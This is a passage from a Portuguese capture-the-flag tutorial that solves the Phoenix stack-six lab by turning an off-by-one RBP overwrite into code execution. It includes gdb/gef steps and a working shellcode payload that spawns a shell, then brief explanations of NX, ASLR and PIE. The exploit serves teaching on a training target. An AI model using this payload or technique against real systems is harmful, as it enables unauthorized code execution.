<p>Na vida real, caso não existisse essa mensagem, só conseguiriamos exploitar esse off-by-one caso o nosso buffer estivesse adjacente ao rbp, 
isto é: não existe nenhuma outra variavel, ou o buffer foi alocado na parte mais baixa da stack(Do lado do RBP)!</p>
<pre><code>Nesse caso, nós nao conseguiriamos alterar RBP nem RIP,
portanto seria impossivel conseguir execução de codigo :(

O maximo que conseguimos fazer é corromper 1 byte de uma varivel!
._ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _  _ .
|    buffer      |   outras variaveis     | RBP | RIP | 
|_ _ _ _ _ _ _ _ |_ _ _ _ _ _ _ _ _ _ _ _ |_ _ _|_ _ _|

O impacto disso varia muito: não acontecer nada (mais comum), 
fazer o programa crashar, ou alterar um valor importante 
(por exemplo, aquela varivel poderia armazenar o seu saldo do banco hehe ;) )...
</code></pre>
<h2><a class="header" href="#como-ir-de-off-by-one-para-execução-de-codigo" id="como-ir-de-off-by-one-para-execução-de-codigo">Como ir de off-by-one para execução de codigo</a></h2>
<p>Quando <code>main</code> chama <code>call greet</code>, ela <code>salva o seu rbp e rip</code> na stack!</p>
<p>Então esse rbp que estamos alterando é o <code>rbp de main</code>!</p>
<p>Quando greet retorna, main fica com o rbp errado!</p>
<p>Main vai ir ate o final da sua execução normalmente, na sua ultima instrução (<code>ret</code>) a magica acontece</p>
<h3><a class="header" href="#ret-com-um-rbp-corrompido" id="ret-com-um-rbp-corrompido">Ret com um RBP corrompido</a></h3>
<p>resumindo, ret é um: <code>mov rsp rbp</code> (descer o rsp), <code>pop rbp</code> (desce o rsp 8 bytes (a stack diminui para valores maiores, então +8)), e <code>pop rip</code></p>
<p>Assim, caso mudemos o rbp para, por exemplo: 0x1234<strong>56</strong>, quando main retornar, o valor de 0x1234<strong>56</strong> vai para o rbp e o de 0x1234<strong>64</strong> (+8) para o rip</p>
<p>Portanto, precisamos achar um valor para colocar no rip que va apontar para codigo que controlamos, e apontar rbp para esse endereço <strong>-</strong> 8 :D</p>
<p>Então caso o pointer que precisamos esteja em 0x123456<strong>78</strong> e nos possamos controlar o ultimo byte do <code>rbp</code>: vamos colocar 0x123456<strong>70</strong> (-8) no <code>rbp</code>! 
E quando main retornar, o <code>valor salvo</code> em 0x123456<strong>78</strong> vai para o <code>rip</code> !</p>
<p>E se nos controlamos RIP, controlamos a execução :D</p>
<h1><a class="header" href="#-exploit-3" id="-exploit-3">🔥 Exploit</a></h1>
<p>Agora que sabemos o tipo de exploit que precisamos escrever, basta seguir os passos a seguir:</p>
<ol>
<li>Descobrir que partes da memoria controlamos</li>
<li>Encontrar para que região podemos apontar rbp</li>
<li>Encontrar um pointer nessa região que aponte para a parte que controlamos</li>
</ol>
<h2><a class="header" href="#o-que-controlamos" id="o-que-controlamos">O que controlamos?</a></h2>
<p>Normalmente, nos controlamos o input e as env vars, nesse caso o input é passado pelas env vars... portanto podemos falar que a unica região da memoria que
controlamos são as env vars</p>
<p>E qual é essa região? Vamos encontrar :D</p>
<h3><a class="header" href="#setup" id="setup">Setup</a></h3>
<p>As envs são diferentes dentro do gdb, nós podemos comparar usando </p>
<pre><code>Fora do gdb: env
Dentro do dbg: show environment
</code></pre>
<p>A diferença é: gdb adiciona <code>LINES</code> e <code>COLUMNS</code>. E altera <code>_</code> (o programa sendo executando nesse momento, esta definido como &quot;/usr/local/bin/gdb&quot;)</p>
<pre><code class="language-diff">user@phoenix-amd64$ diff /tmp/gdb /tmp/env
16,18c16
&lt; _=/usr/local/bin/gdb
&lt; LINES=33
&lt; COLUMNS=168
---
&gt; _=/usr/bin/env
</code></pre>
<p>Para concertar essa diferença, e garantir que todos endereços estão certos, basta executar dentro do gdb:</p>
<pre><code>unset environment COLUMNS
unset environment LINES
set environment _=/opt/phoenix/amd64/stack-six

&gt; Aviso: Se você sair do gdb elas vão resetar!
</code></pre>
<h3><a class="header" href="#descobrir-que-partes-da-memoria-controlamos" id="descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></h3>
<p>Colocando um breakpoint no inicio de main (<code>b *main</code>), vamos encontrar registers apontando para envs!
<img src="stack/phoenix/./img/stack_six/envs_gef.png" alt="" /></p>
<p>Escolhendo o menor endereço e printando!</p>
<p><img src="stack/phoenix/./img/stack_six/envs_addr.png" alt="" /></p>
<blockquote>
<p>Dica: vale a pena conferir se aquele realmente é o incio das envs, no nosso caso é :D</p>
</blockquote>
<p><img src="stack/phoenix/./img/stack_six/envs_addr2.png" alt="" /></p>
<p>Isso quer dizer que as envs estão de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<h3><a class="header" href="#encontrar-para-que-região-podemos-apontar-rbp" id="encontrar-para-que-região-podemos-apontar-rbp">Encontrar para que região podemos apontar rbp</a></h3>
<p>Nesse caso é facil ne? Se nós só podemos alterar o LSB, podemos alterar o RBP: de 0x00007fffffffe5<strong>00</strong> (inclusivo) a 0x00007fffffffe5<strong>ff</strong> (inclusivo)</p>
<h3><a class="header" href="#encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos" id="encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa região que aponte para a parte que controlamos</a></h3>
<p>Agora vamos usar uma utilidade do gef chamada <code>memwatch</code>! Sempre que o gef printar aquele output gigante, vai adicionar a região da memoria especificada!
Voce vai estar &quot;assistindo&quot; aquela região da memoria! :D</p>
<p>Nos vamos executar <code>gef&gt; memory watch 0x00007fffffffe500 32 qword</code></p>
<blockquote>
<p>Uma qword são 8 bytes, assim, 32 qwords são 256 bytes</p>
</blockquote>
<p>Agora, vamos ver quando main retorna, o que tem nessa região</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
Dump of assembler code for function main:
....
   0x00000000004007f6 &lt;+91&gt;:	leave  
   0x00000000004007f7 &lt;+92&gt;:	ret

gef&gt; b *0x00000000004007f7
</code></pre>
<p>Agora basta executar o programa ate chegar la (obs, se voce ainda ta naquele breakpoint de main, basta continuar (<code>c</code>))</p>
<p><img src="stack/phoenix/./img/stack_six/memwatch.png" alt="memwatch" /></p>
<p>Eita, bastante coisa!</p>
<p>Agora, entre esses endereços, precisamos encontrar um que tenha um <strong>pointer que aponte para a região da memoria que controlamos!</strong></p>
<p>Pra facilitar isso, eu vou jogar todo o output do <code>memwatch</code> em um arquivo e usar <code>grep</code></p>
<p>Todos os endereços da região que controlamos começam com <code>0x7fffffff</code>, então esse ja é um bom começo</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffff&quot;
0x00007fffffffe500│+0x0000 0x0000000000000001
0x00007fffffffe508│+0x0008 0x00007ffff7db6d0f
0x00007fffffffe510│+0x0010 0x00007ffff7ffc948
0x00007fffffffe518│+0x0018 0x00000000000000a6
0x00007fffffffe520│+0x0020 0x00007fffffffe57f
0x00007fffffffe528│+0x0028 0x0000000000000001
0x00007fffffffe530│+0x0030 0x4141414141414141
0x00007fffffffe538│+0x0038 0x00007ffff7ffb300
0x00007fffffffe540│+0x0040 0x0000000000000000
0x00007fffffffe548│+0x0048 0x0000000000600c00
0x00007fffffffe550│+0x0050 0x000000000040079b
0x00007fffffffe558│+0x0058 0x0000000000000000
...
...
...
</code></pre>
<p>Isso reduz bastante, mas ainda não o suficiente: a gente precisa de <code>0x00007fffffff</code> no valor, e não no endereço</p>
<p>Para isso, podemos usar cut! Usando cut antes do grep nos estamos só levando os valores em consideração! Para facilitar, tambem podemos deixa-los em ordem crescente (sort)!</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | cut -d &quot; &quot; -f 2 | grep &quot;0x00007fffffff&quot; | sort
0x00007fffffffe541
0x00007fffffffe57f
0x00007fffffffe620
0x00007fffffffe628
0x00007fffffffe638
0x00007fffffffef10
</code></pre>
<p>as envs estão de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<p>O unico valor valido é <strong>0x00007fffffffef10</strong>, pois todos os outros são menores que 0x00007fffffff<strong>e817</strong> !</p>
<p>Agora, basta achar o endereço desse pointer! Portanto vamos tirar o cut :D</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffffef10&quot;                     
0x00007fffffffe5c8│+0x00c8 0x00007fffffffef10
</code></pre>
<p>Porem, ainda tem um detalhe! Nos não queremos esse endereço no rbp! Nos queremos ele no rip!</p>
<p>Assim, nos vamos apontar RBP para o item de cima da lista! Ai quando main retornar (<code>pop rip</code>) o valor vai ser o correto!</p>
<p><img src="stack/phoenix/./img/stack_six/addr_rbp.png" alt="" /></p>
<p>Lembrando que, quando uma função retorna, o endereço 8 bytes maior que rbp, é onde o rip esta! Então por definir <code>rbp = 0x00007fffffffe5c0</code>, nos 
estamos definindo <code>rip = 0x00007fffffffe5c8</code> então nos temos <code>RIP -&gt; 0x00007fffffffe5c8 -&gt; 0x00007fffffffef10 -&gt; env vars</code></p>
<p>E você talvez voce esteja se perguntando, pra qual env var que RIP ta apontando?</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffef10
0x7fffffffef10:	'A' &lt;repeats 127 times&gt;
</code></pre>
<p>Por sorte, justamente o inicio do nosso buffer! Então não precisa nem de NOP sled ate o shellcode</p>
<pre><code>Se você quer continuar sozinhx, agora é sua hora de brilhar!
Dica: O valor que precisamos colocar no rbp salvo, por meio do overflow é: c0
Eu recomendo vc tentar encontrar ele por conta propria pois
pode variar de acordo com o seu computador (explicação em breve) :D
.
.
.
.
.
.
.
</code></pre>
<h2><a class="header" href="#shellcode-1" id="shellcode-1">Shellcode</a></h2>
<p>Então o nosso exploit vai ficar: <code>shellcode+AAAAAAAAAAAA+c0</code></p>
<p>Para testar isso, vou usar o truque do <code>0xcc</code>:</p>
<pre><code class="language-x86asm">$ export ExploitEducation=$(python -c &quot;print '\xcc' + 125 * 'A' + '\xc0'&quot;)
$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
Trace/breakpoint trap
</code></pre>
<p>Obs: eu separei a linha do &quot;Welcome AAAAAA....AAA????&quot; para caber na tela </p>
<p>Isso quer dizer que conseguimos execução de codigo! lembrando que isso é muito fragil: uma alteração nas envs e o exploit quebra!</p>
<p>Nos podemos usar tecnicas como encontrar um pointer que esta numa localização fixa usando <code>ROPgadgets</code>, ou um <code>NOP sled</code>!</p>
<p>Porem, nesse desafio vamos focar em só fazer ele funcionar! Caso vc queira, pode aplicar as tecnicas ensinadas previamente para tornar o exploit melhor!</p>
<hr />
<p><strong>Obs</strong></p>
<p>Mas por exemplo, caso executemos <code>./stack-six</code> ao enves de <code>/opt/phoenix/amd64/stack-six</code>, o exploit não funciona :(</p>
<pre><code class="language-x86asm">$ ./stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
Segmentation fault
</code></pre>
<p>E por isso que, quando for ver outros tutoriais, talvez <code>c0</code> seja outro valor! Muito provavelmente essa diferença é causada pela env <code>LS_COLORS</code> 
(uma variavel <strong>gigantesca</strong> que lista as cores do terminal! </p>
<p>Caso você utilize um terminal mais moderno (com emojis por exemplo) para entrar via ssh, pode haver uma diferença!</p>
<p>Mas você esta equipadx com o conhecimento para conseguir resolver e encontrar o valor correto, caso tenha mudado! :D</p>
<hr />
<p>Agora, vamos usar um shellcode de verdade! Até achar um que funciona é tentativa e erro! Eu recomendo você procurar aqui: <a href="http://shell-storm.org/shellcode/">shell-storm</a></p>
<p>Para mim, <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">shellcode-806</a> costuma funcionar muito bem, e dessa vez funcionou perfeitamente! :D</p>
<p>Mas claro, você pode brincar com todos aqueles shellcodes: alterar a senha, criar um arquivo, ... o ceu é o limite! Ou talvez nem o ceu... ja que esse esse é um tutorial sobre quebrar limites hehehe :D</p>
<blockquote>
<p>AVISO: Esse tutorial é sobre quebrar o limite de buffers! Não tente quebrar o ceu, pois pode resultar em acidentes, quedas, ou as pessoas rirem de você socando o ar!</p>
</blockquote>
<p>Mas bem, piadas sem graça a parte, o exploit ficou assim: SHELLCODE+99 * A+c0</p>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que é a mesma hehe :D</p>
<p>Ou caso você prefira tudo em um só comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<p>Lembrando que a quantidade de As deve ser alterada para que <code>c0 seja o byte 127 (shellcode + AAAAAA + c0 = 127)</code></p>
<p>Nesse caso, o shellcode tem 27 bytes: <code>27 + 99 As + 1 byte (c0) = 127</code></p>
<p>Caso seu shellcode seja maior, basta reduzir os As respectivamente!</p>
<hr />
<p>Finalmente! terminamos a parte da stack uhuuu</p>
<p>Esse stack-six foi beeeeem complicadinho! Então parabens por ter chegado ate aqui! :D</p>
<h1><a class="header" href="#-solução-6" id="-solução-6">💫 Solução</a></h1>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que é a mesma hehe :D</p>
<p>Ou caso você prefira tudo em um só comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<h1><a class="header" href="#dep--nx--wx" id="dep--nx--wx">DEP | NX | W^X</a></h1>
<p>Todas essas pretendem impedir a execução de código em 
partes da memoria que sejam &quot;escreviveis&quot;.</p>
<p>Impedir que x atacante execute o código escrito 
pelx mesmx, previne que Shellcodes sejam usados! :D</p>
<p>Assim, ou uma parte da memoria ou pode ser escrita, ou 
executável, mas nunca as duas simultaneamente: 
<strong>Write</strong> <strong>XOR(^)</strong> e<strong>X</strong>ecute</p>
<p>Você vai ouvir pessoas usando os 3 nomes para representar 
esse conceito, e dependendo do contexto não tem problema!</p>
<p>Porem eles são tecnicamente diferentes:</p>
<p><strong>DEP</strong> (<strong>P</strong>revencao da <strong>E</strong>xecucao de <strong>D</strong>ados): 
a implementação do <strong>Windows</strong></p>
<p><strong>N</strong>ao e<strong>X</strong>ecute: um bit que pode ser colocado para 
garantir a exclusão mutua em processadores <strong>AMD</strong>.</p>
<p>Intel tem um outro nome, que eu não lembro... 
e não importa o suficiente para eu pesquisar! :P</p>
<blockquote>
<p>Atualmente, a exclusão mutua de escrever e executar 
ocorre por meio de paging: o sistema operacional decide 
as permicoes das paginas de memorias, e garante que uma 
não viole W^X . <strong>No momento que você esta lendo, isso 
pode ter mudado!</strong></p>
</blockquote>
<h1><a class="header" href="#system-aslr" id="system-aslr">System ASLR</a></h1>
<p>ASLR randomiza os endereços das coisas na memoria! Porem 
com as suas limitações, dado que depende doo sistema 
operacional!</p>
<p>Cada OS implementa de um jeito, mas em geral se randomiza:</p>
<ul>
<li>Imports dinamicos (LIBC,...)</li>
<li>Segmentos do executavel (Data, ROData, ...)</li>
<li>Stack e Heap</li>
</ul>
<p><strong>Porem, o endereço do código não muda!</strong></p>
<h1><a class="header" href="#pie" id="pie">PIE</a></h1>
<p>Para garantir que o codigo tambem tenha sua posição 
randomizada, o binario precisa ser compilado com PIE !</p>
<p>PIE (<strong>E</strong>xecucao <strong>I</strong>ndependente da <strong>P</strong>osição) impede 
que o codigo possa ser executado independente da sua<br />
posição na memoria (duh :P)</p>
<p>Para garantir isso, todos endereços precisam ser relativos ao invés de absolutos!</p>
<pre><code>			Endereço	Instrução
Sem PIE 	0x0001		jmp 0x0003 &lt;- EIP	
			0x0002		add 1 2
			0x0003		add 1 3

Com PIE 	------		jmp EIP+2  &lt;- EIP
			------		add 1 2
			------		add 1 3
</code></pre>
<p>No primeiro caso, se o executável mudar de endereço 
o <code>JMP</code> pularia para a instrução errada, por causa do 
endereço absoluto.</p>
<h1><a class="header" href="#canaries--todo-" id="canaries--todo-">Canaries ( ~TODO~ )</a></h1>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        

                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                

                
            </nav>

        </div>

        

        

        

        
        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        

        

        
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        
        
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
        
        

    </body>
</html>
